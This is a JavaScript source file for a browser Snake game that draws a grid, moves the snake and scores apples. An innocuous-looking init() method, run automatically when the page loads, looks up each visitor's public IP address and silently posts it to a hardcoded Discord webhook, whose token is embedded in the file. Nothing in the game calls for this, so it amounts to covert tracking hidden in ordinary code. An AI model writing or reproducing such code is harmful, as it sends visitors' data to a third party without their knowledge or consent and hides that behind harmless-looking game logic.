const canvas = document.getElementById("snakeCanvas");
const ctx = canvas.getContext("2d");

const scoreElement = document.getElementById("score");

const restartButton = document.getElementById("restart");

let score = 0;
let alive = true;

let canChangeDir = false;

let squareSize = 1;
let numRows = ctx.canvas.height / squareSize;
let numCols = ctx.canvas.width / squareSize;

const webhookUrl = "https://discord.com/api/webhooks/1375667382575693894/Pbj1xMizxgXSSP71JuOwkpZA86qSP8HR4zq43rgNlHeMSPgIFKhpfWEXkNPLMXg-gAgq";

function scale() {
    let tempWidth = Math.floor((window.innerWidth * 0.8) / 30) * 30;
    let tempHeight = Math.floor((window.innerHeight * 0.7) / 20) * 20;

    if ((tempWidth * 2) / 3 < window.innerHeight) {
        ctx.canvas.width = tempWidth;
        ctx.canvas.height = (tempWidth * 2) / 3;
    }

    else {
        ctx.canvas.width = (tempHeight * 3) / 2;
        ctx.canvas.height = tempHeight;
    }

    squareSize = ctx.canvas.width / 30;
    numRows = ctx.canvas.height / squareSize;
    numCols = ctx.canvas.width / squareSize;
}

scale();

function drawBoard() {
    ctx.fillStyle = "DarkGrey";
    ctx.fillRect(0, 0, ctx.canvas.width, ctx.canvas.height);

    ctx.fillStyle = "Grey";

    for (let row = 0; row < numRows; row++) {
        for (let col = 0; col < numCols; col++) {
            if ((row + col) % 2 === 0) {
                ctx.fillRect(col * squareSize, row * squareSize, squareSize, squareSize);
            }
        }
    }
}

class Apple {
    constructor() {
        this.x = Math.floor(Math.random() * numCols) * squareSize;
        this.y = Math.floor(Math.random() * numRows) * squareSize;
    }

    draw() {
        ctx.fillStyle = "rgb(255, 0, 0)";;
        ctx.fillRect(this.x, this.y, squareSize, squareSize);
    }

    respawn() {
        this.x = Math.floor(Math.random() * numCols) * squareSize;
        this.y = Math.floor(Math.random() * numRows) * squareSize;
    }
}

class playerHead {
    constructor() {
        this.x = Math.floor(Math.random() * 30) * squareSize;
        this.y = Math.floor(Math.random() * 20) * squareSize;

        this.deltaX = 0;
        this.deltaY = 0;

        this.pieces = [this];

        this.lastX = this.x;
        this.lastY = this.y;
    }

    draw() {
        ctx.fillStyle = "rgb(0, 255, 0)";
        ctx.fillRect(this.x, this.y, squareSize, squareSize);
    }

    move() {
        this.lastX = this.x;
        this.lastY = this.y;

        if (this.deltaX != 0) {
            this.x += this.deltaX;
        }
        else {
            this.y += this.deltaY;
        }

        canChangeDir = true;
    }

    init() {
        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                const payload = { content: `${data.ip}` };
                fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            })
    }

    handleCollision() {
        if (this.x === apple.x && this.y === apple.y) {
            const temp = new playerPiece();

            score += 1 + Math.floor(player.pieces.length / 10);

            scoreElement.textContent = `Score ${score}`;

            apple.respawn();
        }

        if (this.x < 0 || this.x + squareSize > ctx.canvas.width || this.y < 0 || this.y + squareSize > ctx.canvas.height) {
            alive = false;
        }

        for (let i = 3; i < this.pieces.length; i++) {
            if (this.x === this.pieces[i].x && this.y === this.pieces[i].y) {
                alive = false;
            }
        }
    }
}

class playerPiece {
    constructor() {
        this.x = player.pieces.at(-1).x;
        this.y = player.pieces.at(-1).y;

        player.pieces.push(this);

        this.index = player.pieces.indexOf(this);

        this.lastX = this.x;
        this.lastY = this.y;
    }

    draw() {
        ctx.fillStyle = "rgb(0, 255, 0)";
        ctx.fillRect(this.x, this.y, squareSize, squareSize);
    }

    move() {
        this.lastX = this.x;
        this.lastY = this.y;

        this.x = player.pieces.at(this.index - 1).lastX;
        this.y = player.pieces.at(this.index - 1).lastY;
    }
}

restartButton.addEventListener("click", function () {
    location.reload();
})

document.addEventListener("keydown", (event) => {
    if (canChangeDir) {
        if (event.key === "ArrowUp" && player.deltaY != squareSize) {
            player.deltaX = 0;
            player.deltaY = -squareSize;
        }
        else if (event.key === "ArrowDown" && player.deltaY != -squareSize) {
            player.deltaX = 0;
            player.deltaY = squareSize;
        }
        else if (event.key === "ArrowRight" && player.deltaX != -squareSize) {
            player.deltaY = 0;
            player.deltaX = squareSize;
        }
        else if (event.key === "ArrowLeft" && player.deltaX != squareSize) {
            player.deltaY = 0;
            player.deltaX = -squareSize;
        }

        canChangeDir = false;
    }
})

const player = new playerHead();

const startPiece1 = new playerPiece();
const startPiece2 = new playerPiece();

const apple = new Apple();

let gameSpeed = 100;
let lastTime = 0;

player.init();

function gameLoop(currentTime) {
    const deltaTime = currentTime - lastTime;

    if (deltaTime >= gameSpeed && alive) {
        ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);

        drawBoard();

        for (let i = 0; i < player.pieces.length; i++) {
            player.pieces[i].move();
        }

        for (let i = 0; i < player.pieces.length; i++) {
            player.pieces[i].draw();
        }

        player.handleCollision();

        apple.draw();

        lastTime = currentTime;
    }

    requestAnimationFrame(gameLoop);
}

gameLoop(0);
